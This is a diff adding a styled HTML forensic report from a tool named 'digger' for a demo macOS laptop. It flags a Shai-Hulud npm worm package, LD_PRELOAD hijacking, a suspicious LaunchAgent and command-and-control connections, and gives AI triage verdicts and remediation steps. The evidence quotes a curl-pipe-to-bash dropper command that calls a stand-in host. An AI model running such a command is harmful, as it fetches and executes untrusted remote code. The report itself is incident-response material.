@@ -1,0 +1,158 @@
+<!doctype html><html lang='en'><head><meta charset='utf-8'><title>digger report — demo-laptop</title><style>
+*{box-sizing:border-box}
+body{margin:0;background:#0c0f14;color:#e6e8ec;font-family:-apple-system,Inter,system-ui,Segoe UI,Roboto,sans-serif;line-height:1.55}
+.banner{display:flex;align-items:center;gap:24px;padding:24px 32px;background:linear-gradient(180deg,#181d27,#0c0f14);border-bottom:1px solid #2a2f3a}
+.banner svg{width:120px;height:auto}
+.banner h1{margin:0;font-size:28px;letter-spacing:1px}
+.banner .meta{margin-top:6px;color:#aab0bd;font-size:13px;font-family:Iosevka,Menlo,Consolas,monospace}
+.summary{padding:24px 32px;background:#10141c;border-bottom:1px solid #2a2f3a}
+.summary h2{margin:0 0 12px;font-size:18px;letter-spacing:.3px;color:#cfd4df}
+.summary .severity{display:inline-block;padding:4px 12px;border-radius:999px;font-size:13px;font-weight:600;color:#0c0f14}
+.summary p{max-width:860px;margin:8px 0 0;color:#d6dae3}
+.summary ul{margin:12px 0 0 20px;padding:0;color:#cfd4df}
+.counts{display:flex;gap:16px;flex-wrap:wrap;padding:18px 32px;background:#0c0f14;border-bottom:1px solid #2a2f3a}
+.counts .pill{padding:10px 14px;background:#181d27;border-radius:10px;font-size:13px;font-family:Iosevka,Menlo,Consolas,monospace}
+.controls{padding:16px 32px;background:#0c0f14;border-bottom:1px solid #2a2f3a;display:flex;gap:12px;flex-wrap:wrap;align-items:center}
+.controls input,.controls select{padding:8px 12px;background:#181d27;border:1px solid #2a2f3a;color:#e6e8ec;border-radius:8px;font-size:14px}
+.controls input{min-width:280px}
+.findings{padding:24px 32px}
+.finding{margin-bottom:14px;background:#10141c;border:1px solid #2a2f3a;border-radius:10px;overflow:hidden}
+.finding header{display:flex;align-items:center;gap:12px;padding:14px 18px;cursor:pointer;user-select:none}
+.finding header:hover{background:#161b25}
+.finding .badge{padding:3px 10px;border-radius:999px;font-size:11px;font-weight:700;color:#0c0f14;text-transform:uppercase;letter-spacing:.5px}
+.finding .title{flex:1;font-size:15px;color:#e6e8ec}
+.finding .detector{color:#8a8f99;font-size:12px;font-family:Iosevka,Menlo,Consolas,monospace}
+.finding .body{padding:0 18px 18px;border-top:1px solid #1d222d;display:none}
+.finding.open .body{display:block}
+.finding .body h4{margin:14px 0 6px;color:#cfd4df;font-size:13px;text-transform:uppercase;letter-spacing:.6px}
+.finding .body p{margin:0;color:#d6dae3}
+.finding pre{background:#0a0d13;border:1px solid #1d222d;padding:12px;border-radius:8px;color:#cfd4df;overflow-x:auto;font-size:12px;font-family:Iosevka,Menlo,Consolas,monospace}
+.tag{display:inline-block;padding:2px 8px;background:#181d27;border:1px solid #2a2f3a;border-radius:6px;color:#aab0bd;font-size:11px;margin-right:4px;font-family:Iosevka,Menlo,Consolas,monospace}
+.verdict-confirmed_malicious{color:#ff2e6c;font-weight:700}
+.verdict-likely_malicious{color:#ff7a4a;font-weight:700}
+.verdict-needs_investigation{color:#ffd152;font-weight:700}
+.verdict-likely_benign{color:#9cd28a}
+.verdict-false_positive{color:#8a8f99}
+footer{padding:24px 32px;color:#6a6f7c;font-size:12px;border-top:1px solid #2a2f3a}
+.chain-panel{background:#10141c;border:1px solid #2a2f3a;border-radius:10px;padding:14px 18px}
+.chain-title{color:#d0c39a;font-size:12px;text-transform:uppercase;letter-spacing:.6px;margin-bottom:10px;font-weight:700}
+.chain-title .alg{display:inline-block;padding:1px 7px;font-size:10px;font-weight:700;border-radius:4px;background:#26230f;color:#d0c39a;margin-left:8px;letter-spacing:.5px}
+.chain-tbl{width:100%;border-collapse:collapse;font-size:12px}
+.chain-tbl th{text-align:left;font-weight:600;color:#aab0bd;padding:6px 12px 6px 0;border-bottom:1px solid #1d222d;text-transform:uppercase;font-size:10px;letter-spacing:.5px}
+.chain-tbl td{padding:6px 12px 6px 0;color:#cfd4df;font-family:Iosevka,Menlo,Consolas,monospace;border-bottom:1px solid #1d222d}
+.chain-tbl td:first-child{color:#d0c39a;font-family:-apple-system,Inter,system-ui,sans-serif;text-transform:uppercase;font-size:10px;letter-spacing:.6px;width:80px}
+.chain-tbl td.hash{word-break:break-all;font-size:11px}
+.chain-note{margin-top:10px;color:#6a6f7c;font-size:11px;font-family:Iosevka,Menlo,Consolas,monospace}
+.chain-note code{color:#d0c39a}
+</style></head><body><header class='banner'><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 280" role="img" aria-label="digger logo: skeleton holding a shovel">
+  <defs>
+    <radialGradient id="bg" cx="50%" cy="40%" r="70%">
+      <stop offset="0%" stop-color="#161a22"/>
+      <stop offset="100%" stop-color="#05070a"/>
+    </radialGradient>
+    <linearGradient id="bone" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0%" stop-color="#f3efe3"/>
+      <stop offset="100%" stop-color="#bdb6a1"/>
+    </linearGradient>
+    <linearGradient id="steel" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0%" stop-color="#c9cdd5"/>
+      <stop offset="100%" stop-color="#5a6068"/>
+    </linearGradient>
+  </defs>
+  <!-- emblem disc -->
+  <circle cx="120" cy="140" r="115" fill="url(#bg)" stroke="#e8e3d4" stroke-width="3"/>
+  <circle cx="120" cy="140" r="105" fill="none" stroke="#3a3f48" stroke-width="1"/>
+  <!-- shovel: diagonal from top-left to bottom-right -->
+  <g transform="rotate(-32 120 140)">
+    <rect x="116" y="35" width="8" height="170" fill="url(#steel)" stroke="#2a2e36" stroke-width="1.2"/>
+    <!-- T-grip -->
+    <rect x="100" y="28" width="40" height="14" rx="4" fill="url(#steel)" stroke="#2a2e36" stroke-width="1.2"/>
+    <!-- shovel head -->
+    <path d="M 100 200 L 140 200 L 152 250 L 120 268 L 88 250 Z" fill="url(#steel)" stroke="#2a2e36" stroke-width="1.4"/>
+    <line x1="120" y1="208" x2="120" y2="258" stroke="#2a2e36" stroke-width="1"/>
+  </g>
+  <!-- skull -->
+  <g>
+    <ellipse cx="120" cy="92" rx="34" ry="38" fill="url(#bone)" stroke="#5a5240" stroke-width="1.5"/>
+    <!-- eye sockets -->
+    <ellipse cx="107" cy="90" rx="7" ry="9" fill="#05070a"/>
+    <ellipse cx="133" cy="90" rx="7" ry="9" fill="#05070a"/>
+    <!-- nasal cavity -->
+    <path d="M 120 100 L 116 112 L 124 112 Z" fill="#05070a"/>
+    <!-- teeth -->
+    <rect x="104" y="116" width="32" height="6" fill="#05070a"/>
+    <line x1="112" y1="116" x2="112" y2="122" stroke="url(#bone)" stroke-width="1.2"/>
+    <line x1="120" y1="116" x2="120" y2="122" stroke="url(#bone)" stroke-width="1.2"/>
+    <line x1="128" y1="116" x2="128" y2="122" stroke="url(#bone)" stroke-width="1.2"/>
+    <!-- cracks -->
+    <path d="M 100 78 L 92 70 M 100 78 L 96 86" stroke="#5a5240" stroke-width="1" fill="none"/>
+  </g>
+  <!-- spine + ribs -->
+  <g stroke="url(#bone)" stroke-width="2.5" fill="none">
+    <line x1="120" y1="132" x2="120" y2="200"/>
+    <path d="M 96 142 Q 120 152 144 142"/>
+    <path d="M 92 154 Q 120 166 148 154"/>
+    <path d="M 90 168 Q 120 180 150 168"/>
+    <path d="M 92 182 Q 120 192 148 182"/>
+  </g>
+  <!-- left arm (gripping shovel handle, which is rotated above) -->
+  <g stroke="url(#bone)" stroke-width="4" fill="none" stroke-linecap="round">
+    <line x1="100" y1="138" x2="74" y2="118"/>
+    <line x1="74" y1="118" x2="56" y2="90"/>
+  </g>
+  <!-- right arm (down across the shovel shaft) -->
+  <g stroke="url(#bone)" stroke-width="4" fill="none" stroke-linecap="round">
+    <line x1="140" y1="138" x2="168" y2="160"/>
+    <line x1="168" y1="160" x2="186" y2="186"/>
+  </g>
+  <!-- hands -->
+  <circle cx="56" cy="90" r="5" fill="url(#bone)" stroke="#5a5240" stroke-width="1"/>
+  <circle cx="186" cy="186" r="5" fill="url(#bone)" stroke="#5a5240" stroke-width="1"/>
+  <!-- wordmark -->
+  <text x="120" y="248" text-anchor="middle" font-family="Iosevka,Menlo,Consolas,monospace" font-size="20" font-weight="700" fill="#e8e3d4" letter-spacing="6">DIGGER</text>
+</svg>
+<div><h1>digger forensic report</h1><div class='meta'>demo-laptop &middot; macos 15.1 &middot; case demo-case-2026-05-20<br>generated 2026-05-20 19:40:08 EDT</div></div></header><section class='summary'><h2>Executive summary <span class='severity' style='background:#ff2e6c'>critical</span></h2><p>demo-laptop has converging evidence of active compromise. A lockfile in /Users/analyst/code/frontend pins chalk@5.6.1, a known-bad version of the Shai-Hulud npm worm campaign, and the worm&#x27;s signature workflow file (shai-hulud-workflow.yml) is present alongside it. A bash process spawned by Chrome is curl-piping a remote script into a shell. Outbound traffic from that shell terminates at 185.220.101.46, an IP currently listed in abuse.ch ThreatFox. LD_PRELOAD is set to a path under /tmp, which would inject an attacker-controlled library into every newly-launched process. A LaunchAgent references a binary under /Users/Shared/.cache/. Either the host has been compromised, or this is an extremely well-staged false positive.</p><h2 style='margin-top:18px;font-size:14px'>Top actions</h2><ul><li>Isolate the host from the network (yank cable, disable Wi-Fi).</li><li>Revoke NPM_TOKEN and any GitHub PATs the user has used recently.</li><li>Snapshot the case directory: `digger pqc sign --case-dir ...` for evidence integrity before further action.</li><li>Capture volatile state: process memory, open sockets, ARP cache, before reboot.</li><li>Audit recent `npm publish` activity at the user&#x27;s NPM account.</li><li>Engage internal IR or external response retainer; this is a multi-vector intrusion.</li></ul><p style='margin-top:14px'><strong>If compromised:</strong> Treat as a confirmed worm-driven supply-chain compromise. Assume credential theft has occurred. Rotate every secret in scope before reconnecting to the network.</p><p style='margin-top:6px'><strong>Attribution hint:</strong> Shai-Hulud npm worm (community-attributed; multi-actor)</p></section><section class='counts'><div class='pill'>artifacts: 7</div><div class='pill'>findings: 7</div><div class='pill' style='border-left:3px solid #ff2e6c'>critical: 3</div><div class='pill' style='border-left:3px solid #ff9b3a'>high: 3</div><div class='pill' style='border-left:3px solid #ffd152'>medium: 0</div><div class='pill' style='border-left:3px solid #7cc4ff'>low: 0</div><div class='pill' style='border-left:3px solid #8a8f99'>info: 1</div></section><section class='controls'><input id='filter' type='text' placeholder='filter findings by text…'><select id='sev'><option value=''>all severities</option><option value='critical'>critical</option><option value='high'>high</option><option value='medium'>medium</option><option value='low'>low</option><option value='info'>info</option></select></section><section class='findings' id='findings'><div class='finding' data-sev='critical' data-text='live threatfox ip match: 185.220.101.46 established connection to 185.220.101.46:443 matches a live threatfox indicator. treat as confirmed command-and-control infrastructure. c2'><header onclick='this.parentNode.classList.toggle("open")'><span class='badge' style='background:#ff2e6c'>critical</span><span class='title'>Live ThreatFox IP match: 185.220.101.46</span><span class='detector'>c2</span></header><div class='body'><span class='tag'>MITRE T1071</span><p>Established connection to 185.220.101.46:443 matches a live ThreatFox indicator. Treat as confirmed command-and-control infrastructure.</p><h4>Evidence</h4><pre>{
+  &quot;ip&quot;: &quot;185.220.101.46&quot;,
+  &quot;raddr&quot;: [
+    &quot;185.220.101.46&quot;,
+    443
+  ]
+}</pre></div></div><div class='finding' data-sev='critical' data-text='shai-hulud compromised package: chalk@5.6.1 project /users/analyst/code/frontend has compromised npm package chalk@5.6.1 in its lockfile. this package version is listed as part of the shai-hulud npm worm campaign. treat the host as potentially compromised: rotate tokens, audit recent `npm publish` activity, and inspect for the worm workflow file. shai_hulud'><header onclick='this.parentNode.classList.toggle("open")'><span class='badge' style='background:#ff2e6c'>critical</span><span class='title'>Shai-Hulud compromised package: chalk@5.6.1</span><span class='detector'>shai_hulud</span></header><div class='body'><span class='tag'>MITRE T1195.002</span><p>Project /Users/analyst/code/frontend has compromised npm package chalk@5.6.1 in its lockfile. This package version is listed as part of the Shai-Hulud npm worm campaign. Treat the host as potentially compromised: rotate tokens, audit recent `npm publish` activity, and inspect for the worm workflow file.</p><h4>AI triage</h4><p><span class='verdict-confirmed_malicious'>confirmed_malicious</span> (confidence , reassessed severity <strong>critical</strong>)</p><p>chalk@5.6.1 lockfile entry matches the Shai-Hulud worm; rotate tokens immediately</p><p>Observed: package-lock.json pins chalk@5.6.1, a version on the Shai-Hulud compromised-package list (multiple corroborating sources: Aikido, StepSecurity, Socket.dev). Inferred: any `npm install` that ran in this project may have executed the worm&#x27;s post-install script, which exfiltrates env-var secrets to webhook.site and attempts to self-propagate by publishing malicious versions of the user&#x27;s own packages.</p><h4>Next steps</h4><ul><li>Immediately revoke the user&#x27;s NPM_TOKEN and any GitHub PATs accessible from this shell session.</li><li>Audit recent `npm publish` activity on the user&#x27;s account at https://www.npmjs.com/settings/&lt;user&gt;/packages.</li><li>Inspect for the worm-installed `.github/workflows/shai-hulud-workflow.yml` — see the next finding.</li><li>Delete node_modules, remove the compromised version from package-lock.json, re-run `npm install --ignore-scripts`.</li><li>Run `trufflehog` against the affected repo to find any leaked credentials.</li></ul><p><strong>Attribution hint:</strong> Shai-Hulud npm worm campaign (multi-actor, first wave Sep 2025)</p><h4>Evidence</h4><pre>{
+  &quot;package&quot;: &quot;chalk@5.6.1&quot;,
+  &quot;project&quot;: &quot;/Users/analyst/code/frontend&quot;
+}</pre></div></div><div class='finding' data-sev='critical' data-text='shai-hulud worm workflow artifact: /users/analyst/code/frontend/.github/workflows/shai-hulud-workflow.yml github actions workflow file matches the worm&#x27;s filename signature and references the canonical webhook.site exfil endpoint. this is the self-propagation vehicle of the shai-hulud worm. shai_hulud'><header onclick='this.parentNode.classList.toggle("open")'><span class='badge' style='background:#ff2e6c'>critical</span><span class='title'>Shai-Hulud worm workflow artifact: /Users/analyst/code/frontend/.github/workflows/shai-hulud-workflow.yml</span><span class='detector'>shai_hulud</span></header><div class='body'><span class='tag'>MITRE T1199</span><p>GitHub Actions workflow file matches the worm&#x27;s filename signature and references the canonical webhook.site exfil endpoint. This is the self-propagation vehicle of the Shai-Hulud worm.</p><h4>Evidence</h4><pre>{
+  &quot;bad_name&quot;: true,
+  &quot;markers&quot;: [
+    &quot;shai-hulud&quot;,
+    &quot;webhook.site&quot;
+  ],
+  &quot;path&quot;: &quot;/Users/analyst/code/frontend/.github/workflows/shai-hulud-workflow.yml&quot;
+}</pre></div></div><div class='finding' data-sev='high' data-text='ld_preload set in environment ld_preload is set to &#x27;/tmp/.x11-unix/.libtelemetry.so&#x27;. this forces the dynamic linker to load an attacker-controlled library into every spawned process. almost never legitimate on user desktops. env_hijack'><header onclick='this.parentNode.classList.toggle("open")'><span class='badge' style='background:#ff9b3a'>high</span><span class='title'>LD_PRELOAD set in environment</span><span class='detector'>env_hijack</span></header><div class='body'><span class='tag'>MITRE T1574.006</span><p>LD_PRELOAD is set to &#x27;/tmp/.X11-unix/.libtelemetry.so&#x27;. This forces the dynamic linker to load an attacker-controlled library into every spawned process. Almost never legitimate on user desktops.</p><h4>Evidence</h4><pre>{
+  &quot;value&quot;: &quot;/tmp/.X11-unix/.libtelemetry.so&quot;,
+  &quot;var&quot;: &quot;LD_PRELOAD&quot;
+}</pre></div></div><div class='finding' data-sev='high' data-text='persistence entry references /users/shared/.cache/ launchagent com.example.helper executes /users/shared/.cache/helper as a daemon. persistence entries should not reference world-shared scratch space. persistence_outlier'><header onclick='this.parentNode.classList.toggle("open")'><span class='badge' style='background:#ff9b3a'>high</span><span class='title'>Persistence entry references /Users/Shared/.cache/</span><span class='detector'>persistence_outlier</span></header><div class='body'><span class='tag'>MITRE T1543.001</span><p>LaunchAgent com.example.helper executes /Users/Shared/.cache/helper as a daemon. Persistence entries should not reference world-shared scratch space.</p><h4>Evidence</h4><pre>{
+  &quot;match&quot;: &quot;/Users/Shared/&quot;,
+  &quot;subject&quot;: &quot;launchd:/Users/analyst/Library/LaunchAgents/com.example.helper.plist&quot;
+}</pre></div></div><div class='finding' data-sev='high' data-text='shell (bash) spawned by browser (google chrome) pid 2204 (bash) was spawned by browser process google chrome. browsers should not parent shells; this is characteristic of post-exploitation via a malicious extension or compromised renderer. suspicious_processes'><header onclick='this.parentNode.classList.toggle("open")'><span class='badge' style='background:#ff9b3a'>high</span><span class='title'>Shell (bash) spawned by browser (Google Chrome)</span><span class='detector'>suspicious_processes</span></header><div class='body'><span class='tag'>MITRE T1059</span><p>PID 2204 (bash) was spawned by browser process Google Chrome. Browsers should not parent shells; this is characteristic of post-exploitation via a malicious extension or compromised renderer.</p><h4>AI triage</h4><p><span class='verdict-likely_malicious'>likely_malicious</span> (confidence , reassessed severity <strong>high</strong>)</p><p>Chrome→bash with curl|bash pattern strongly suggests post-exploitation through a renderer or extension</p><p>Observed: bash process with parent PID 1487 (Google Chrome) and a command line that pipes a remote-downloaded shell script directly into bash. Browsers do not legitimately spawn interactive shells; the curl|bash pattern is a textbook dropper. Inferred: post-exploitation via a malicious extension or a compromised renderer tab. Source reliability is high (deterministic OS API); information credibility is moderate pending corroboration with browser-extension audit.</p><h4>Next steps</h4><ul><li>Preserve volatile state: `lsof -p 2204`, `proc info 2204`, and `kill -STOP 2204` (do not kill yet).</li><li>Audit installed Chrome extensions: chrome://extensions/ and `chrome --enable-logging --vmodule=*extension*=2`.</li><li>Pull the install.sh from the captured URL in a sandbox and inspect.</li><li>Run `digger loki scan` to cross-check against signature-base IOCs.</li><li>Rotate any tokens that were in env vars on this shell (see env_hijack finding).</li></ul><h4>Evidence</h4><pre>{
+  &quot;cmdline&quot;: &quot;/bin/bash -c &#x27;curl -fsSL https://wbn.example.io/install.sh | bash&#x27;&quot;,
+  &quot;pid&quot;: 2204,
+  &quot;ppid&quot;: 1487
+}</pre></div></div><div class='finding' data-sev='info' data-text='external connection to 185.220.101.46:443 established connection to public address 185.220.101.46:443 from pid 2204 (bash). network_anomaly'><header onclick='this.parentNode.classList.toggle("open")'><span class='badge' style='background:#8a8f99'>info</span><span class='title'>External connection to 185.220.101.46:443</span><span class='detector'>network_anomaly</span></header><div class='body'><span class='tag'>MITRE T1071</span><p>Established connection to public address 185.220.101.46:443 from PID 2204 (bash).</p><h4>Evidence</h4><pre>{
+  &quot;pid&quot;: 2204,
+  &quot;raddr&quot;: [
+    &quot;185.220.101.46&quot;,
+    443
+  ]
+}</pre></div></div></section><footer><div class='chain-panel'><div class='chain-title'>chain-tip integrity<span class='alg'>SHA-256</span><span class='alg'>SHA3-256</span></div><table class='chain-tbl'><tr><th></th><th>SHA-256 (FIPS 180-4)</th><th>SHA3-256 (FIPS 202)</th></tr><tr><td>artifacts</td><td class='hash'>f5202eee6cc3d8fc5c426f609f9439536c345f0b86674f9a0febc49dfa5bc208</td><td class='hash'>9f554dec43c887231cddefecd944aa3fca9d0edb2fbf4bd4e6ca62f25900fb12</td></tr><tr><td>findings</td><td class='hash'>013e92dccf7c38bf22c45b8116d71742bc5103b2357ae03b23b55dab288743af</td><td class='hash'>f4842f325762aada157021bd67cc71ed3d23869ae482a20b68c7cc9048cb3709</td></tr></table><div class='chain-note'>case id <code>demo-case-2026-05-20</code> · both chains must verify · <code>digger verify --case-dir &lt;case&gt;</code></div></div></footer>
+<script>
+const f=document.getElementById('filter'),s=document.getElementById('sev');
+function apply(){
+  const q=(f.value||'').toLowerCase(), sv=s.value;
+  document.querySelectorAll('.finding').forEach(el=>{
+    const ok=(!q||el.dataset.text.includes(q))&&(!sv||el.dataset.sev===sv);
+    el.style.display=ok?'':'none';
+  });
+}
+f.addEventListener('input',apply); s.addEventListener('change',apply);
+</script>
+</body></html>
